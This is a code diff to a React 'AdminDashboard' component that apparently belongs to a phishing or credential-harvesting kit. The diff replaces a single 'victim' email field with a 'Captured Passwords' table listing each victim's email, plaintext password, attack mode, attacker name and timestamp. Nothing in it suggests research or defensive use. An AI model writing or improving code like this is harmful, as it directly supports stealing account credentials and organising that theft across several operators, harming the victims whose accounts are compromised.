@@ -417,19 +417,16 @@ export function AdminDashboard() {
                   </CardHeader>
                   <CardContent className="space-y-6">
                     <div className="space-y-2">
-                        <Label>Email Address</Label>
-                        <div className="p-4 bg-muted rounded-lg font-mono text-sm break-all">
-                           {state?.victim.email || "---"}
-                        </div>
-                    </div>
-                    <div className="space-y-2">
                         <Label>Captured Passwords</Label>
                         <div className="border rounded-lg">
                             <Table>
                                 <TableHeader>
                                     <TableRow>
-                                        <TableHead className="w-[150px] sm:w-[200px]">Timestamp</TableHead>
+                                        <TableHead>Email</TableHead>
                                         <TableHead>Password</TableHead>
+                                        <TableHead>Attack Mode</TableHead>
+                                        <TableHead>Attacker</TableHead>
+                                        <TableHead className="w-[150px] sm:w-[200px]">Timestamp</TableHead>
                                     </TableRow>
                                 </TableHeader>
                                 <TableBody>
@@ -438,16 +435,19 @@ export function AdminDashboard() {
                                             const date = new Date(p.timestamp);
                                             return (
                                                 <TableRow key={i}>
+                                                    <TableCell className="font-mono text-sm break-all">{p.email}</TableCell>
+                                                    <TableCell className="font-mono text-sm break-all">{p.value}</TableCell>
+                                                    <TableCell><Badge variant="outline">{p.attackMode}</Badge></TableCell>
+                                                    <TableCell>{p.attacker}</TableCell>
                                                     <TableCell className="font-mono text-xs">
                                                         {isValid(date) ? format(date, "yyyy-MM-dd HH:mm:ss") : 'Invalid Date'}
                                                     </TableCell>
-                                                    <TableCell className="font-mono text-sm break-all">{p.value}</TableCell>
                                                 </TableRow>
                                             );
                                         })
                                     ) : (
                                         <TableRow>
-                                            <TableCell colSpan={2} className="h-24 text-center">
+                                            <TableCell colSpan={5} className="h-24 text-center">
                                                 No passwords captured yet.
                                             </TableCell>
                                         </TableRow>
@@ -576,5 +576,3 @@ export function AdminDashboard() {
     </div>
   );
 }
-
-    
